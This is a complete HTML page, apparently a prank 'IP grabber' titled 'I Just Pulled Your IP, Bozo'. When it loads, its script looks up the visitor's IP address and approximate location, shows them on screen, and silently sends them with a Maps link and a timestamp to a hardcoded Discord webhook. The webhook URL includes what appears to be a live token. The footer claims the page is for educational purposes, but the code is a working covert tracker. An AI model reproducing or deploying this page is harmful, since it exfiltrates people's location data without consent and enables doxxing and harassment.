<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>I Just Pulled Your IP</title>
    <style>
        /* Modern Dark Theme */
        :root {
            --bg-color: #1a1a1a;
            --card-bg: #2d2d2d;
            --text-color: #f5f5f5;
            --accent-color: #ff4757;
            --shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: var(--card-bg);
            border-radius: 12px;
            box-shadow: var(--shadow);
            padding: 2rem;
            max-width: 500px;
            width: 90%;
            text-align: center;
            animation: fadeIn 0.5s ease-in-out;
        }

        h1 {
            color: var(--accent-color);
            margin-bottom: 1.5rem;
            font-size: 2rem;
            font-weight: bold;
        }

        .info-box {
            background-color: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            text-align: left;
        }

        .info-box p {
            margin: 0.5rem 0;
            font-size: 1rem;
        }

        .info-box strong {
            color: var(--accent-color);
        }

        .maps-link {
            color: var(--accent-color);
            text-decoration: none;
            transition: opacity 0.3s ease;
        }

        .maps-link:hover {
            opacity: 0.8;
        }

        .footer {
            margin-top: 1.5rem;
            font-size: 0.9rem;
            color: #aaa;
        }

        .loader {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid var(--accent-color);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 1rem auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .glow {
            animation: glow 1.5s infinite alternate;
        }

        @keyframes glow {
            from { box-shadow: 0 0 10px var(--accent-color); }
            to { box-shadow: 0 0 20px var(--accent-color); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>I Just Pulled Your IP, Bozo üåê</h1>
        
        <div class="info-box">
            <div id="loader" class="loader"></div>
            <div id="content" style="display: none;">
                <h2>Here's Your Info:</h2>
                <p><strong>IP Address:</strong> <span id="ip"></span></p>
                <p><strong>Location:</strong> <span id="location"></span></p>
                <p><strong>Approximate Location:</strong><br>
                    <a class="maps-link" id="maps" target="_blank">
                        View on Google Maps
                    </a>
                </p>
            </div>
        </div>

        <div class="footer">
            <p>Relax, this is just for educational purposes. No hard feelings, bozo.</p>
        </div>
    </div>

    <script>
        async function logToDiscord(data) {
            const webhookURL = 'https://discord.com/api/webhooks/1343601853564190720/g_rWs-7V-e8pA71vGfvZBGKKI6cDhQP03RenN19Dfro2F1qLke4LS4ar1JeO4XRUs_HP';
            
            const payload = {
                content: `üåê New IP Log:\n\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.region}, ${data.country}\n**Maps:** ${data.maps}\n**Timestamp:** ${new Date().toISOString()}`
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Error logging to Discord:', error);
            }
        }

        async function getLocationData() {
            try {
                // Get IP and location data
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locationData = await locationResponse.json();

                // Create Google Maps link
                const mapsLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;

                // Update UI
                document.getElementById('loader').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                document.getElementById('ip').textContent = ipData.ip;
                document.getElementById('location').textContent = 
                    `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
                document.getElementById('maps').href = mapsLink;

                // Log to Discord
                await logToDiscord({
                    ip: ipData.ip,
                    city: locationData.city,
                    region: locationData.region,
                    country: locationData.country_name,
                    maps: mapsLink
                });

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loader').style.display = 'none';
                document.getElementById('content').innerHTML = 
                    '<p>Error retrieving your info. Try again, bozo.</p>';
            }
        }

        // Start the process when page loads
        window.onload = getLocationData;
    </script>
</body>
</html>
